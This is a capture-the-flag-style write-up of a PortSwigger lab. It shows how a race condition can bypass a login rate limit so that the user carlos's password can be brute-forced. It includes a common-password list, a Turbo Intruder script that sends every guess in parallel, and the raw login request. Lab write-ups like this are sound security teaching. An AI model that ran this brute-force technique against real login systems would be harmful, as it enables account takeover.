# Bypassing rate limits via race conditions

**Lab URL:** https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits

### Goal - 

Exploit the race condition to bypass the rate limit to Successfully brute-force the password for the user `carlos`. Log in and access the admin panel then Delete the user `carlos`.

### Analysis/Exploitation -

{% hint style="info" %}
Note
- Solving this lab requires Burp Suite 2023.9 or higher. You should also use the latest version of the Turbo Intruder, which is available from the [BApp Store](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988).
{% endhint %}

  - You have a time limit of 15 mins. If you don’t solve the lab within the time limit, you can reset the lab. However, Carlos’s password changes each time.
### list of potential passwords:

```text
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
```

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_001.png)

**Experiment with the login function by intentionally submitting incorrect passwords for your own account.**

- After testing, It is found that there’s a rate limit. After 3 wrong login attempts, you're temporarily blocked from making any more login attempts for the same account.
- Try logging in using another arbitrary username and observe that you see the normal `Invalid username or password` message. This indicates that the rate limit is enforced per-username rather than per-session.
- Deduce that the number of failed attempts per username must be stored server-side.
- Consider that there may be a race window between:
  - When you submit the login attempt.
  - When the website increments the counter for the number of failed login attempts associated with a particular username.

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_001.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_002.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_003.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_004.png)

**Test for race condition!**

When we clicked the “Log in” button, it’ll send a POST request to `/login`, with parameter `csrf`, `username`, and `password`.

After user lockout is gone, send the login request to Burp Suite’s Repeater 5 times, group them together, select "Send group in parallel", and send it:

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_005.png)

Observe that More than three requests received the normal `Invalid username and password` response.No more rate limiting!  the login function is vulnerable to race condition.

**Now, we can use “Turbo Intruder” to brute force **`carlos`**’s password with bypassing rate limiting via race condition:**

In the Python editor, choose the `examples/race-single-packet-attack.py` Python template:

In order to make it brute force user `carlos`’s password, we’ll need to modify the template to:

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_006.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_007.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_008.png)

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    passwords = ['123123', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '1234567890', 'michael', 'x654321', 'superman', '1qaz2wsx', 'baseball', '7777777', '121212', '000000']
    # the 'gate' argument withholds the final byte of each request until openGate is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

{% hint style="info" %}
💡 Ways to provide wordlist in turbo intruder

```python
# assign the list from your clipboard
passwords = wordlists.clipboard
for password in passwords:
        engine.queue(target.req, password, gate='race1')
```

```python
# assign the list by directly adding them
passwords = ['a','b','c','1',]
for password in passwords:
        engine.queue(target.req, password, gate='race1')
```

```python
# assign the list from file
for word in open('c:/path/to/burp-passwd.txt'):
    engine.queue(target.req, word.rstrip(), gate='race1')
```

{% endhint %}

**And add **`%s`** string formatting placeholder in the **`password`** POST parameter in the HTTP request:**

```text
POST /login HTTP/2
Host: 0a8700c60427bda288e290c7001500b5.web-security-academy.net
Cookie: session=4EAp3UZ022KeX6D50w7FESJoixZtTh5s

csrf=dL20kaRyH4RJaFOtxT5KbhLdJtVIZYwe&username=carlos&password=%s
```

**Then launch the attack:**

In here, we found that there’s a **HTTP status code “302 Found”**, which means this request has the correct password!

**Finally, login as **`carlos`** , **navigate to Admin Panel and delete the User Carlos to solve the Lab

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_009.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_010.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_011.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_012.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_013.png)

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/Race_condition/images/1f025b9ab6dd_014.png)

### Why It Works

This lab's login mechanism uses rate limiting to defend against brute-force attacks.

### Key Takeaways

- This lab's login mechanism uses rate limiting to defend against brute-force attacks.
